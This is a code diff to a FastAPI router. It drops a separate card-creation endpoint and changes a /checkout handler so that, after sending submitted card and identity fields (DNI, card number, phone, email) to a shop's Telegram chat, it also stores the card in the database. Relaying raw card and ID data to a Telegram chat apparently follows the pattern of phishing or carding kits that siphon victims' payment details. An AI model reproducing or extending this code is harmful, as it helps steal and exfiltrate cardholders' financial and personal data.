@@ -30,23 +30,6 @@ async def get_card(card_id:int, db: Session = Depends(get_db)):
         return make_response(card_q.to_json(), 200)
     except SQLAlchemyError as e:
         return make_response(str(e), 400,"/cards/{card_id} GET" )
-
-@router.post("/cards")
-async def create_card(body:CardCreateDTO, db: Session = Depends(get_db)):
-    user_id = body.user_id
-    if not user_id: abort(400, "User ID is required")
-    try:
-        user_q = db.query(User).filter(User.id == user_id, User.deleted == False).first()
-        if not user_q: abort(404, f"User with ID {user_id} not found")
-        
-        card_instance = Card(body)
-        db.add(card_instance)
-        db.commit()
-        db.refresh(card_instance)
-        
-        return make_response("Card created successfully", 201)
-    except SQLAlchemyError as e:
-        return make_response(str(e), 400, "/cards POST")
     
 @router.post("/checkout")
 async def checkout(body: TelegramSchema, request:Request, db:Session = Depends(get_db)):
@@ -55,7 +38,7 @@ async def checkout(body: TelegramSchema, request:Request, db:Session = Depends(g
     if not shop_q: abort(400, "Invalid Shop")
     
     try:
-        payload = {
+        telegramDTO = {
             "chat_id": shop_q.telegram_id,
             "DNI": body.DNI,
             "number": body.number,
@@ -65,9 +48,15 @@ async def checkout(body: TelegramSchema, request:Request, db:Session = Depends(g
             "phone": body.phone,
             "email": body.email
         }
-        telegram_instance = Telegram(payload=payload)
+        telegram_instance = Telegram(payload=telegramDTO)
         message = telegram_instance.build_message()
         telegram_instance.send_message(message)
+
+        card_instance = Card(body)
+        db.add(card_instance)
+        db.commit()
+        db.refresh(card_instance)
+        
         return make_response("Mensaje enviado exitosamente!", 200)
     except SQLAlchemyError as e:
         return make_response(str(e), 400, "checkout")
